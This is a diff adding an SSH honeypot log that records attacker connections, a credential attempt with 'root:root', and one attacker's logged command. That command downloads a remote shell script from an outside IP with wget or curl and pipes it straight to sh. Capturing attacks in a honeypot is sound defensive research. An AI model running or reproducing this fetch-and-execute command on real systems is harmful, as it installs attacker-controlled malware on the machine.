@@ -1,0 +1,20 @@
+2025-12-05 00:05:46.778 - [Info] MITM Version: 1.4
+2025-12-05 00:05:46.782 - [Info] Auto Access Enabled: true
+2025-12-05 00:05:46.782 - [Debug] [Init] Auto Access Barrier: true
+2025-12-05 00:05:46.788 - [Info] SSH man-in-the-middle server for 172.20.0.2 listening on 0.0.0.0:10001
+2025-12-05 00:05:58.490 - [Debug] [Connection] Attacker connected: 193.32.127.228 | Client Identification: SSH-2.0-paramiko_3.5.1
+2025-12-05 00:05:58.842 - [Debug] [Connection] Attacker connected: 104.248.199.237 | Client Identification: SSH-2.0-Go
+2025-12-05 00:05:59.897 - [Debug] [Auth] Attacker 193.32.127.228 trying to authenticate with "password"
+2025-12-05 00:05:59.899 - [Debug] [Auto Access] Attacker: 193.32.127.228, Threshold: 1, Attempts: 1
+2025-12-05 00:05:59.899 - [Debug] [Auto Access] Compromising the honeypot
+2025-12-05 00:05:59.899 - [Debug] [Auto Access] Adding the following credentials: "root:root"
+2025-12-05 00:06:01.105 - [Debug] [Auth] Valid credentials - Password Authentication
+2025-12-05 00:06:01.105 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.2
+2025-12-05 00:06:01.188 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2025-12-05 00:06:02.154 - [Debug] [EXEC] Noninteractive mode attacker command: (wget -qO- http://70.184.13.47/rondo.yah.sh||busybox wget -qO- http://70.184.13.47/rondo.yah.sh||curl -s http://70.184.13.47/rondo.yah.sh||good -qO- http://70.184.13.47/rondo.yah.sh)|sh;echo infected;
+2025-12-05 00:06:02.767 - [Debug] [Auth] Attacker 104.248.199.237 trying to authenticate with "none"
+2025-12-05 00:06:02.767 - [Debug] [Auth] Attacker authentication error: No authentication method provided
+2025-12-05 00:06:03.644 - [Debug] [Auth] Attacker 104.248.199.237 trying to authenticate with "password"
+2025-12-05 00:06:03.648 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2025-12-05 00:06:03.648 - [Debug] [Auth] Attacker: 104.248.199.237 has so far made 1 attempts. Remaining: 5 attempts
+2025-12-05 00:06:04.146 - [Debug] [Connection] Attacker closed the connection
